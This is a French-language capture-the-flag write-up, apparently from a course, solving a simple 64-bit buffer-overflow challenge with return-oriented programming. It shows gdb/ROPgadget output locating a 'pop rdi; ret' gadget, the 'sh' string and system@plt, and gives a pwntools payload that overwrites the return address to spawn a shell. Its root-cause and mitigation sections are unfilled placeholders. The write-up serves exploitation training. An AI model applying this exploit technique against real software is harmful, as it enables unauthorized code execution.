---
title: "6-rop-01-simple"
challenge: "Neal"
difficulty: "Easy"
platform: "amd64/remote"
date: "2025-11-21"
tags: [binary, overflow, rop]
author: "Ryan Bouchou"
status: "solved"
---

# Titre lisible

**Résumé**
Challenge initiatique d'élaboration d'un payload basé du ROP.

---

## Contexte

- Source : cours
- Environnement testé : Arch Linux, amd64, glibc 2.35
- Fichiers fournis : vuln, main.c

---

## Objectif

Obtenir un shell

---

## Outils

- gdb + gef / pwndbg
- pwntools (python3)
- ROPgadget

---

## Analyse

### 1) Reconnaissance statique

Rien de particulier.

### 2) Analyse dynamique

1. Déterminer l'adresse de l'argument souhaité de `system` ; à savoir `sh\0`.

Breakpoint sur `main` et identification de l'adresse de `sh\0` :

```asm
rintf@plt (
 $rdi = 0x0000000000402008 → "Please don't override the buffer ! Otherwise the p[...]"
```

Sinon, on peut directement chercher la chaîne en question avec :

```zsh
grep sh
```

On identifie ensuite la position exacte des octets qui nous intéressent au sein de la chaîne :

```asm
gef➤  x/3xb 0x402049
0x402049:       0x73    0x68    0x00
```

2. Détermination du gadget, notamment `pop rdi; ret` afin d'affecter l'adresse précédente à `rdi` lors de l'appel à `system`.

```nasm
 offsec/rop/rop-simple   main  ? ❯ ROPgadget --binary 6-rop-01-simple | grep rdi                     ℂ -gcc  3.13.7  15:07
0x0000000000401052 : mov ch, byte ptr [rdi] ; add byte ptr [rax], al ; push 2 ; jmp 0x401020
0x00000000004010c6 : or dword ptr [rdi + 0x404010], edi ; jmp rax
0x0000000000401138 : or ebp, dword ptr [rdi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401263 : pop rdi ; ret
```

Ainsi, l'adresse du gadget est `0x0000000000401263`

3. Enfin, il nous faut un gadget effectuant
   un appel système ; en l'occurence, ce dernier est naturellement présent dans le code vulnérable :

```asm
 0x00000000004011b0 <+90>:    call   0x401030 <system@plt>
```

### 3) Exploit

Stratégie : Return Oriented Programming

À partir du buffer overflow, nous allons réécrire la pile comme suit :

`saved_rip <- 0x0000000000401263`: pour initaliser l'argument de `system`
`saved_rip + 8 <- 0x402049` : valeur pop dans `rdi`
`saved_rip + 16 <- 0x401030` : valeur pop dans rip lors du `ret` du gadget

Concernant le payload, et notamment l'overflow, on constate que le buffer est situé à une distance de `0x28`octets de `saved_rip` :

```asm
   0x0000000000401180 <+42>:    lea    rax,[rbp-0x20]
```

-> Initialisation des arguments de `gets`

Payload (extrait) :

```py
gadget_adr = int("401263", 16)
arg_adr = int("402049", 16)
system_adr = int("401030", 16)

payload = b''
payload += b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa"
payload += p64(gadget_adr)
payload += p64(arg_adr)
payload += p64(system_adr)

io.sendlineafter(b"name: ", payload)
io.interactive()
```

---

## Résultat

- Flag : CTF{...}

## Root cause

Explication courte du bug

## Mitigation

- corrections proposées

## Leçons apprises / next steps

- pistes d'amélioration

## Commandes & références

## Artefacts

- exploit.py
